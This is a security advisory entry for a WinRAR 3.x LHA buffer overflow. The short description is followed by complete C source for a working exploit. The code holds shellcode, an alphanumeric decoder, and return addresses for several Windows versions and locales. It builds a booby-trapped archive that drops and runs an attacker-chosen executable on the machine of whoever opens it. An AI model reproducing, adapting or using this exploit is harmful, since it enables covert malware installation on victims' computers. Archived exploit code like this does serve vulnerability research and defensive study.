source: http://www.securityfocus.com/bid/19043/info

WinRAR is susceptible to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.

This vulnerability allows attackers to execute arbitrary machine code in the context of the affected application.

Versions of WinRAR from 3.0 to 3.60 beta 6 are vulnerable to this issue.

/*
*-----------------------------------------------------------------------
*
* lzh.c - WinRAR 3.x LHA Buffer Overflow Exploit
*
* Copyright (C) 2006 XSec All Rights Reserved.
*
* Author   : nop
*          : nop#xsec.org
*          : http://www.xsec.org
*          :
* Tested   : Windows 2000 SP4 CN
*          : Windows XP SP1/SP2 CN/EN
*          :   + WinRAR 3.42
*          :   + WinRAR 3.51
*          :   + WinRAR 3.60 beta6
*          :
* Complie  : cl lzh.c
*          :
*      
*------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

//-----------------------------------------
// 参数定义
//-----------------------------------------
#define BUFF_SIZE       102400
#define RET_OFFSET      0x14
#define FILE_LEN        0xE6
#define DIR_LEN         0x3FF-3
#define LH_LEN          22
#define LE_LEN          6
#define LEE_LEN         2

#define SC_LEN_OFFSET   10
#define DC_LEN          26

#define DATABASE        0x61

// 22 bytes
unsigned char LHAHeader[] =
"\xff\x00\x2d\x6c\x68\x30\x2d\x00\x00\x00\x00\x00\x00\x00\x00\x29"
"\xb4\xf5\x34\x20\x01\xe6";

// 6 bytes
unsigned char LHAExt[] =
"\x00\x00\x4d\xff\x03\x02";

// 2 bytes
unsigned char LHAExtEnd[] =
"\x00\x00";

// 26 bytes Alpha Decode by nop (for WinRAR LHZ Exploit)
unsigned char Decode[] =
"\x8b\xf4\x83\xc6\x1a\x56\x5f\x91\x66\xb9\xff\x02\x66\xad\x66\x2d"
"\x61\x61\xc0\xe0\x04\x02\xc4\xaa\xe2\xf2";

// 336 bytes Shellcode by nop (for WinRAR LHZ Exploit)
unsigned char SC[] =
"\xe9\x16\x01\x00\x00\x5f\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b"
"\x70\x1c\xad\x8b\x68\x08\x8b\xf7\x6a\x0b\x59\xe8\xb6\x00\x00\x00"
"\xe2\xf9\x33\xdb\x89\x56\x3c\x83\x46\x3c\x04\x81\x7e\x3c\xff\xff"
"\x00\x00\x0f\x8d\x9b\x00\x00\x00\x53\xff\x76\x3c\xff\x56\x14\x3b"
"\x46\x2c\x75\xe3\x6a\x00\x6a\x00\xff\x76\x30\xff\x76\x3c\xff\x56"
"\x20\xff\x76\x34\x6a\x40\xff\x56\x28\x89\x46\x44\x6a\x00\x8d\x5e"
"\x34\x53\xff\x76\x34\x50\xff\x76\x3c\xff\x56\x18\x8b\x4e\x34\x8a"
"\x46\x38\x8b\x5e\x44\x4b\x30\x04\x0b\xe2\xfb\x83\xec\x50\x8b\xdc"
"\x6a\x50\x53\xff\x56\x04\xc7\x04\x03\x5c\x61\x2e\x65\xc7\x44\x03"
"\x04\x78\x65\x00\x00\x89\x5e\x48\x33\xc0\x50\x50\x6a\x02\x50\x50"
"\x68\x00\x00\x00\xc0\xff\x76\x48\xff\x56\x10\x83\xf8\x00\x7e\x23"
"\x89\x46\x40\x6a\x00\x8d\x5e\x34\x53\xff\x76\x34\xff\x76\x44\xff"
"\x76\x40\xff\x56\x1c\xff\x76\x40\xff\x56\x24\x8b\xdc\x6a\x00\x53"
"\xff\x56\x08\xff\x56\x0c\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78\x03"
"\xf5\x56\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33\xdb"
"\x0f\xbe\x10\x3a\xd6\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xf1\x3b"
"\x1f\x75\xe7\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c"
"\x03\xdd\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\xe5\xfe\xff\xff"
"\x8e\x4e\x0e\xec\xc1\x79\xe5\xb8\x98\xfe\x8a\x0e\xef\xce\xe0\x60"
"\xa5\x17\x00\x7c\xad\x9b\x7d\xdf\x16\x65\xfa\x10\x1f\x79\x0a\xe8"
"\xac\x08\xda\x76\xfb\x97\xfd\x0f\xec\x97\x03\x0c";

//--------------------------------------------------------------------------------
// 目标类型列表
//--------------------------------------------------------------------------------
struct
{
   DWORD    dwJMP;
   char    *szDescription;
}
targets[] =
{
   //{0x77E424DA, "Debug"},
   {0x7ffa4512, "CN    2K/XP/2K3    ALL"},         // jmp  esp addr for all CN win2000/winxp/win2003
   {0x7ffa24ce, "TW    2K/XP/2K3    ALL"},         // jmp  esp addr for all TW win2000/winxp/win2003
   {0x7ffa82a4, "KR    2K/XP/2K3    ALL"},         // call esp addr for all KR win2000/winxp/win2003  
   {0x7801F4FB, "ALL   2K           SP3/SP4"},     // push esp,xx, ret (msvcrt.dll) for all win2000 SP3/SP4    
   {0x77C5BAFC, "EN    XP           SP0/SP1"},     // push esp,xx, ret (msvcrt.dll) for EN winxp SP0/SP1
   {0x77C60AFC, "EN    XP           SP2"},         // push esp,xx, ret (msvcrt.dll) for EN winxp SP2
},v;


//--------------------------------------------------------------------------------
// 变量定义
//--------------------------------------------------------------------------------
unsigned char RunSC[1024]    = {0};
unsigned char FilePath[0xFF] = {0};
unsigned char DirPath[0x3FF] = {0};
char          *AppFile       = NULL;
char          *ExeFile       = NULL;
char          *OutFile       = "0day.zip";
BOOL          bAppend        = FALSE;
int           iType          = 0;
unsigned int  Sc_len         = 0;
DWORD         dwFileSize     = 0;
DWORD         dwOffsetSize   = 0;
DWORD         dwExeSize      = 0;
DWORD         dwExeXor       = 0;
BYTE          cExeXor        = 0;

HANDLE      hFile            = INVALID_HANDLE_VALUE;
HANDLE      hAppend          = INVALID_HANDLE_VALUE;
char *      pFile            = NULL;
char*       pAppend          = NULL;

//--------------------------------------------------------------------------------
// 初始化Rand
//--------------------------------------------------------------------------------
void InitRandom()
{
   //srand(GetTickCount());
   srand((unsigned)time(NULL));
}

//--------------------------------------------------------------------------------
//  随机函数
//--------------------------------------------------------------------------------
char RandomC()
{
   DWORD dwRand;
   char cRand;
   
   dwRand= rand();
   cRand = dwRand%255+1;

   return(cRand);
}

//--------------------------------------------------------------------------------
// 随机填充
//--------------------------------------------------------------------------------
void RandFill(char *buf, int len)
{
   int  i;
   
   for(i=0; i< len;i ++)
   {        
       buf[i] = RandomC();
   }
}

//--------------------------------------------------------------------------------
//  随机函数
//--------------------------------------------------------------------------------
DWORD Random(DWORD dwRange)
{
   DWORD dwRand;
   DWORD dwRet;
   
   dwRand = rand();
   
   if(dwRange!=0)
       dwRet = dwRand%dwRange;
   else
       dwRet=0;
       
   return(dwRet);
}

//--------------------------------------------------------------------------------
// Get function hash
//--------------------------------------------------------------------------------
unsigned long hash(char *c)
{
   unsigned long h=0;

   while(*c)
   {
       __asm ror h, 13
       
       h += *c++;
   }
   
   return(h);
}

//--------------------------------------------------------------------------------
// print shellcode
//--------------------------------------------------------------------------------
void PrintSc(char *lpBuff, int buffsize)
{
   int i,j;
   char *p;
   char msg[4];

   for(i=0;i<buffsize;i++)
   {
       if((i%16)==0)
       {
           if(i!=0)
               printf("\"\n\"");
           else
               printf("\"");
       }

       sprintf(msg, "\\x%.2X", lpBuff[i] & 0xff);

       for( p = msg, j=0; j < 4; p++, j++ )
       {
           if(isupper(*p))
               printf("%c", _tolower(*p));
           else
               printf("%c", p[0]);
       }
   }
   printf("\";\n");
}

//--------------------------------------------------------------------------------
// 字母编码
//--------------------------------------------------------------------------------
void EncodeSc(unsigned char* sc, int len, unsigned char* dstbuf)
{
    
    int j;
    unsigned char temp;
    
    for(j=0; j<len; j++)
    {
         temp=sc[j];
         dstbuf[2*j]=DATABASE+temp/0x10;
         dstbuf[2*j+1]=DATABASE+temp%0x10;
    }
    
    //dstbuf[2*j]=0x00;
}

//--------------------------------------------------------------------------------
// 产生ShellCode
//--------------------------------------------------------------------------------
void Make_ShellCode()
{
   unsigned char  sc[1024] = {0};
   unsigned int   len = 0;

   int i,j,k,l;

   Sc_len = sizeof(SC)-1;
   memcpy(sc, SC, Sc_len);
     
   // Add Size Var
   memcpy(sc+Sc_len, &dwFileSize, 4);
   memcpy(sc+Sc_len+4, &dwOffsetSize, 4);
   memcpy(sc+Sc_len+4+4, &dwExeSize, 4);
   memcpy(sc+Sc_len+4+4+4, &dwExeXor, 4);
   Sc_len += 16;

   memcpy(&Decode[SC_LEN_OFFSET], &Sc_len, 2);
   
   //printf("// %d bytes decode \r\n", strlen(Decode));
   //PrintSc(Decode, DC_LEN);

   memset(RunSC, 0, sizeof(RunSC));
   memcpy(RunSC, sc, Sc_len);
   
   //printf("// %d bytes shellcode \r\n", Sc_len);
   //PrintSc(RunSC, Sc_len);
}

//--------------------------------------------------------------------------------
// 产生文件
//--------------------------------------------------------------------------------
void PutFile(char *szFile)
{
   DWORD       dwBytes  = 0;
   DWORD       dwCount  = 0;
   DWORD       dwOffset = 0;
   int         i        = 0;
   

   __try
   {        
       hFile = CreateFile(szFile,
           GENERIC_WRITE,
           FILE_SHARE_READ,
           NULL,
           CREATE_ALWAYS,
           FILE_ATTRIBUTE_NORMAL,
           0);

       if(hFile == INVALID_HANDLE_VALUE)
       {
           printf("[-] Create file %s error!\n", szFile);
           __leave;            
       }

       pFile = (char*)malloc(BUFF_SIZE);
       if(!pFile)
       {
           printf("[-] pFile malloc buffer error!\n");
           __leave;
       }

       memset(pFile, 0, BUFF_SIZE);
       
       
       //--------------------------------------------
       // Append LHA File
       //--------------------------------------------
       if(bAppend)
       {
           hAppend = CreateFile(AppFile,
               GENERIC_READ,
               FILE_SHARE_READ,
               NULL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
   
           if(hAppend == INVALID_HANDLE_VALUE)
           {
               printf("[-] Open file %s error!\n", AppFile);
              // __leave;        
              exit(1);
                   
           }
       
           dwFileSize = GetFileSize(hAppend, 0);
           
           if(!dwFileSize)
           {
               printf("[-] Get AppendFile   : %s size error!\n", AppFile);
               __leave;  
           }
           
           printf("[+] Get AppendFile   : %s (size:%d).\n", AppFile, dwFileSize);
           
           pAppend = (char *)malloc(dwFileSize);
           if(!pAppend)
           {
               printf("[-] pAppend malloc buff error!\n");
               __leave;
           }
           memset(pAppend, 0, dwFileSize);
                   
           if(!ReadFile(hAppend, pAppend, dwFileSize, &dwBytes, NULL))
           {
               printf("[-] ReadFile error!\n");
               __leave;
           }
           
           CloseHandle(hAppend);
           hAppend=INVALID_HANDLE_VALUE;
           
           dwFileSize --;
           
           WriteFile(hFile, pAppend, dwFileSize, &dwBytes, NULL);  
           printf("[+] Write AppendData : %s (%d bytes)\n", szFile, dwFileSize);
           
           free(pAppend);
           
       }      
               
       hAppend = CreateFile(ExeFile,
               GENERIC_READ,
               FILE_SHARE_READ,
               NULL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
   
       if(hAppend == INVALID_HANDLE_VALUE)
       {
           printf("[-] Open file %s error!\n", ExeFile);
               //__leave;            
           exit(1);
       }
       
       dwExeSize = GetFileSize(hAppend, 0);
           
       if(!dwExeSize)
       {
           printf("[-] Get AppendData  : %s size error!\n", ExeFile);
           __leave;  
       }
           
       printf("[+] Get ExeFile      : %s (size:%d).\n", ExeFile, dwExeSize);
           
       pAppend = (char *)malloc(dwExeSize);
       if(!pAppend)
       {
           printf("[-] pAppend malloc buff error!\n");
           __leave;
       }
       memset(pAppend, 0, dwExeSize);
                   
       if(!ReadFile(hAppend, pAppend, dwExeSize, &dwBytes, NULL))
       {
           printf("[-] ReadFile error!\n");
           __leave;
       }
           
       cExeXor = RandomC();
       dwExeXor = cExeXor;
       printf("[+] Exe Rand Xor Key : 0x%.2x\n", cExeXor);
       for(i=0; i<dwExeSize; i++)
       {
          pAppend[i] ^= cExeXor;                
       }
           
       /*
       printf("hFile %lx, hAppend %lx\n", hFile, hAppend);
       for(i=0;i<65535;i+=4)
       {
           
          dwBytes = GetFileSize(i, 0);  
          if(dwBytes != 0xFFFFFFFF) printf("%x   %d\n", i, dwBytes);  
       }
       */
         
       CloseHandle(hAppend);
       hAppend=INVALID_HANDLE_VALUE;
       
       //memcpy(DirPath, RunSC, Sc_len);
       printf("[+] Fill LHA & ShellCode ...\n");
       
       // Put LHAHeader
       memcpy(pFile, LHAHeader, LH_LEN);
       dwCount += LH_LEN;
       
       // Put FilePath (ret+nop)
       memset(&FilePath, '\x90', sizeof(FilePath));
 
       //memcpy(&FilePath[RET_OFFSET], &RetAddr, 4);       // JMP ESP
       memcpy(&FilePath[RET_OFFSET], &targets[iType].dwJMP, 4);
       printf("[+] RET Addr         : 0x%lx \n", targets[iType].dwJMP);
       
       //memcpy(&FilePath[RET_OFFSET+4], &Decode, DC_LEN);
       dwOffset = dwCount + RET_OFFSET + 4;
       
       
       memcpy(pFile+dwCount, &FilePath, FILE_LEN);
       dwCount += FILE_LEN;
       
       // Put LHAExtHeader
       memcpy(pFile+dwCount, &LHAExt, LE_LEN);    
       dwCount += LE_LEN;
       
       // Put DirPath (nop+ShellCode+nop)
       memset(&DirPath, '\x42', sizeof(DirPath));
       
       dwOffsetSize = dwCount + DIR_LEN + LEE_LEN + dwFileSize;
       dwFileSize = dwOffsetSize + dwExeSize;
           
       printf("[+] File Size        : 0x%lx (%d) bytes\n", dwFileSize, dwFileSize);
       printf("[+] Offset Size      : 0x%lx (%d) bytes\n", dwOffsetSize, dwOffsetSize);
       printf("[+] ExeFile Size     : 0x%lx (%d) bytes\n", dwExeSize, dwExeSize);

       printf("[+] Make Shellcode ...\n");    
       Make_ShellCode();
       
       printf("[+] Encode Shellcode ...\n");
       EncodeSc(RunSC, Sc_len, DirPath);
       
       
       memcpy(pFile+dwOffset, &Decode, DC_LEN);
       
       memcpy(pFile+dwCount, &DirPath, DIR_LEN);
       //memcpy(pFile+dwCount, "ABCDEFGHIJKLMNOP", 16);
       dwCount += DIR_LEN;
       
       memcpy(pFile+dwCount, &LHAExtEnd, LEE_LEN);
       dwCount += LEE_LEN;
       
       WriteFile(hFile, pFile, dwCount, &dwBytes, NULL);
       printf("[+] Write LHAData    : %s (%d bytes)\n", szFile, dwCount);
       
       WriteFile(hFile, pAppend, dwExeSize, &dwBytes, NULL);
       printf("[+] Write ExeData    : %s (%d bytes)\n", szFile, dwExeSize);
       
       dwFileSize = GetFileSize(hFile, 0);
       printf("[+] FileSize         : %d bytes\n", dwFileSize);
       printf("[+] All Done! Have fun!\n");
   }

   __finally
   {        
       if(hFile != INVALID_HANDLE_VALUE)
           CloseHandle(hFile);
           
       if(hAppend != INVALID_HANDLE_VALUE)
           CloseHandle(hAppend);
           
       if(pFile)
           free(pFile);
       
       if(pAppend)
           free(pAppend);
   }
}

//--------------------------------------------------------------------------------
//  测试是否为值
//--------------------------------------------------------------------------------
int TestIfIsValue(char *str)
{
   if(str == NULL ) return(0);
   if(str[0]=='-') return(0);
   if(str[0]=='/') return(0);
   return(1);
}

//--------------------------------------------------------------------------------
//  打印目标类型列表
//--------------------------------------------------------------------------------
void showtype()
{
   int i;

   printf( "[Type]:\n");
   for(i=0;i<sizeof(targets)/sizeof(v);i++)
   {
       printf("\t%d\t0x%x\t%s\n", i, targets[i].dwJMP, targets[i].szDescription);
   }
   printf("\n");
}

//--------------------------------------------------------------------------------
//  打印帮助信息
//--------------------------------------------------------------------------------
void usage(char *p)
{
   printf( "[Usage:]\n"
           "    %s [Options] <ExeFile>\n\n"
           "[Options:]\n"
           "    /a <LHZFile>   Append LHZ(lha)File\n"
           "    /o <OutFile>   Output file name, default is %s\n"
           "    /t <OSType>    Target Type, default is 0\n\n",
           p, OutFile);

   showtype();
}

//--------------------------------------------------------------------------------
//  主函数
//--------------------------------------------------------------------------------
void main(int argc, char **argv)
{
   char *url = NULL;
   int   i   = 0;
   
   printf("WinRAR 3.x LHA Buffer Overflow Exploit (Fucking 0day!!!)\n");
   printf("Code by nop nop#xsec.org, Welcome to http://www.xsec.org\n\n");  
   
   InitRandom();
   
   if(argc < 2)
   {
       usage(argv[0]);
       return;
   }
   
   for(i=1; i<argc-1; i++)
   {
       switch(argv[i][1])
       {
       case 'a':
           if(i < argc-1 && TestIfIsValue(argv[i+1]))
           {    
               AppFile = argv[i+1];
               bAppend = TRUE;
           }
           else
           {
               usage(argv[0]);
               return;
           }
           i++;
           break;
       case 'o':
          if(i < argc-1 && TestIfIsValue(argv[i+1]))
           {    
               OutFile = argv[i+1];
           }
           else
           {
               usage(argv[0]);
               return;
           }
           i++;
           break;
       case 't':
           if(i < argc-1 && TestIfIsValue(argv[i+1]))
           {    
               iType = atoi(argv[i+1]);
           }
           else
           {
               usage(argv[0]);
               return;
           }
           i++;
           break;
       }
   }
   
   ExeFile = argv[i];

   if((iType<0) || (iType>=sizeof(targets)/sizeof(v)))
   {
       usage(argv[0]);
       printf("[-] Invalid type.\n");
       return;
   }
   
   PutFile(OutFile);
}